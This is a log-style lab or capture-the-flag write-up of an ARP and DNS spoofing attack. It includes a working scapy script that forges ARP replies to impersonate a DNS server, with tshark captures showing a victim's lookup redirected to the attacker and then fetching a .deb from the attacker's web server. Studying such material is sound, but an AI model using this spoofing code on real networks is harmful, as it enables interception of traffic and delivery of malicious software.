                 2381 2427.887958485 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2382 2428.935949396 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35     

            
2020-12-31 18:17:24.623 +00:00 [INF] Using arp_resp_02.py I have discovered something called Gratuitous ARP

                3388 3397.343838237 00:00:00:00:00:00 → 4c:24:57:ab:ed:84 ARP 42 Gratuitous ARP for 10.6.6.35 (Reply) (duplicate use of 10.6.6.35 detected!)
                 
                https://wiki.wireshark.org/Gratuitous_ARP#:~:text=Gratuitous%20ARPs%20are%20useful%20for%20four%20reasons%3A%201,to%20that%20MAC%20address%20...%20More%20items...%20

            
2020-12-31 18:17:24.628 +00:00 [INF] Using arp_resp_03.py we still get Gratuitous ARP but no duplicate

                 4013 3987.852213869 00:00:00:00:00:00 → 4c:24:57:ab:ed:84 ARP 42 Gratuitous ARP for 10.6.6.35 (Reply)             
                 4014 3988.868052715 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                
                 4015 3988.892174494 00:00:00:00:00:00 → 4c:24:57:ab:ed:84 ARP 42 Gratuitous ARP for 10.6.6.35 (Reply)             
                 4016 3989.908116466 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                
                 4017 3989.928012661 00:00:00:00:00:00 → 4c:24:57:ab:ed:84 ARP 42 Gratuitous ARP for 10.6.6.35 (Reply)             
                 4018 3990.944052549 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35        

            
2020-12-31 18:17:24.661 +00:00 [INF] Final ARP script is arp_resp_04.py

                guest@b19f4c3c04f9:~$ nano arp_resp_04.py
                ... 

                #!/usr/bin/python3
                from scapy.all import *
                import netifaces as ni
                import uuid
                # Our eth0 ip
                ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
                # Our eth0 mac address
                macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
                print(ipaddr)
                print(macaddr)
                def handle_arp_packets(packet):
                    # if arp request, then we need to fill this out to send back our mac as the response
                    if ARP in packet and packet[ARP].op == 1:
                        print(packet.sprintf("<- op=%ARP.op% hwsrc=%ARP.hwsrc% psrc=%ARP.psrc% pdst=%ARP.pdst% hwdst=%ARP.hwdst%"))
                        ether_resp = Ether(dst=packet[ARP].hwsrc, type=0x806, src=macaddr)
                        arp_response = ARP(pdst=macaddr)        
                        arp_response.op = 2             # Opcode (reply) "is-at"
                        arp_response.plen = 4           # Protocol size
                        arp_response.hwlen = 6          # Hardware size
                        arp_response.ptype = 0x800      # Protocol type is IPv4 (0x800)
                        arp_response.hwtype = 1         # Hardware type: Ethernet (1)
                        arp_response.hwsrc = macaddr
                        arp_response.psrc = packet[ARP].pdst
                        arp_response.hwdst = packet[ARP].hwsrc
                        arp_response.pdst = packet[ARP].psrc
                        response = ether_resp/arp_response
                        print(arp_response.sprintf("=> op=%ARP.op% hwsrc=%ARP.hwsrc% psrc=%ARP.psrc% pdst=%ARP.pdst% hwdst=%ARP.hwdst%"))
                        sendp(response, iface="eth0", verbose = 0)

                def main():
                    # We only want arp requests
                    berkeley_packet_filter = "(arp[6:2] = 1)"
                    # sniffing for one packet that will be sent to a function, while storing none
                    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=100)
                if __name__ == "__main__":
                    main()

                ...
                guest@b19f4c3c04f9:~$ chmod +x arp_resp_04.py 
                guest@b19f4c3c04f9:~$ ./arp_resp_04.py               

                10.6.0.4
                02:42:0a:06:00:04
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84


                guest@b19f4c3c04f9:~$ tshark -n                                                                                                             
                Capturing on 'eth0'                                                                                                                        
                    1 0.000000000 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
                    2 0.023991170 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
                    3 0.052358930    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org                                                
                    4 1.040034346 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
                    5 1.063910552 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
                    6 1.084385701    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org                                                
                    7 2.079993078 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
                    8 2.099982227 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
                    9 2.120378861    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org                                                
                   10 3.127982679 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
                   11 3.151950098 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
                   12 3.168600217    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org                                                
                   13 4.167959632 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
                   14 4.204196263 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
                   15 4.220402011    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org                                                
                   16 5.219938579 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                           
                   17 5.243955227 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04                                           
                   18 5.260375086    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org

            
2020-12-31 18:17:24.797 +00:00 [INF] Working on DNS now...

                https://jasonmurray.org/posts/scapydns/
                dport=packet[UDP].sport,
                sport=packet[UDP].dport
            
2020-12-31 18:17:24.826 +00:00 [INF] We can see some new packets flying our way when running tshark -n... :) 

                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=9719
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=24411 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=24411
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=44865 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=44865
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=21870 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=21870
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=3814 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=3814
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=47329 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=47329
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=38174 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=38174
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=8476 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=8476
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=27723 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=27723
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=42743 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=42743
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=40064 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=40064
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=7904 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=7904
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=6510 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=6510
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=40911 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=40911
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=19645 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=19645
                                                                                                                                                            │
                ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                  188 7.649785362    10.6.6.35 → 10.6.0.4     TLSv1.3 286 Application Data, Application Data, Application Data
                  189 7.650477486     10.6.0.4 → 10.6.6.35    TCP 66 50768 → 64352 [ACK] Seq=810 Ack=2245 Win=64128 Len=0 TSval=3020227848 TSecr=1611965490
                  190 7.650584627     10.6.0.4 → 10.6.6.35    TCP 66 50768 → 64352 [FIN, ACK] Seq=810 Ack=2245 Win=64128 Len=0 TSval=3020227848 TSecr=1611965490
                  191 7.650608495    10.6.6.35 → 10.6.0.4     TCP 66 64352 → 50768 [ACK] Seq=2245 Ack=811 Win=64640 Len=0 TSval=1611965494 TSecr=3020227848
                  192 7.656692208 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04
                  193 7.673073041    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
                  194 7.697342766    10.6.6.53 → 10.6.6.35    DNS 104 Standard query response 0x0000 A ftp.osuosl.org A 10.6.0.4
                  195 7.699907289     10.6.0.4 → 10.6.6.35    TCP 74 50772 → 64352 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=3020227897 TSecr=0 WS=128
                  196 8.672807313 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                  197 8.700693969 02:42:0a:06:00:04 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:04
                  198 8.704002672     10.6.0.4 → 10.6.6.35    TCP 74 [TCP Retransmission] 50772 → 64352 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=3020228901 TSecr=0 WS=128
                  199 8.704081393    10.6.6.35 → 10.6.0.4     TCP 74 64352 → 50772 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1460 SACK_PERM=1 TSval=1611966547 TSecr=3020228901 WS=128
                  200 8.704103085     10.6.0.4 → 10.6.6.35    TCP 66 50772 → 64352 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=3020228901 TSecr=1611966547
                  201 8.704890201     10.6.0.4 → 10.6.6.35    TLSv1 583 Client Hello
                  202 8.704941104    10.6.6.35 → 10.6.0.4     TCP 66 64352 → 50772 [ACK] Seq=1 Ack=518 Win=64768 Len=0 TSval=1611966548 TSecr=3020228902
                  203 8.706094444    10.6.6.35 → 10.6.0.4     TLSv1.3 1579 Server Hello, Change Cipher Spec, Application Data, Application Data, Application Data, Application Data
                  204 8.706113019     10.6.0.4 → 10.6.6.35    TCP 66 50772 → 64352 [ACK] Seq=518 Ack=1514 Win=64128 Len=0 TSval=3020228903 TSecr=1611966549
                  205 8.706572890     10.6.0.4 → 10.6.6.35    TLSv1.3 146 Change Cipher Spec, Application Data
                  206 8.706787919    10.6.6.35 → 10.6.0.4     TLSv1.3 321 Application Data
                  207 8.706889103     10.6.0.4 → 10.6.6.35    TLSv1.3 278 Application Data
                  208 8.706912105    10.6.6.35 → 10.6.0.4     TLSv1.3 321 Application Data
                  209 8.709461212    10.6.6.35 → 10.6.0.4     TCP 74 43254 → 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=1611966553 TSecr=0 WS=128
                  210 8.709484337     10.6.0.4 → 10.6.6.35    TCP 54 80 → 43254 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
                  211 8.710391445    10.6.6.35 → 10.6.0.4     TLSv1.3 286 Application Data, Application Data, Application Data
                  212 8.711089848     10.6.0.4 → 10.6.6.35    TCP 66 50772 → 64352 [ACK] Seq=810 Ack=2245 Win=64128 Len=0 TSval=3020228908 TSecr=1611966550
                  213 8.711197824     10.6.0.4 → 10.6.6.35    TCP 66 50772 → 64352 [FIN, ACK] Seq=810 Ack=2245 Win=64128 Len=0 TSval=3020228908 TSecr=1611966550

            
2020-12-31 18:17:25.656 +00:00 [INF] When running python3 -m http.server 80 we can see that mr JF is trying to get deb file...  

                => op =is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                  │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=13920
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=38582 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=38582
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=32989 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=32989
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=34817 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=34817
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=31409 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=31409
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=59144 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=59144
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=61144 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=61144
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=59206 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=59206
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=54464 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=54464
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=62160 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=62160
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=36632 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=36632
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=13897 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=13897
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=49061 UDP.dport=domain
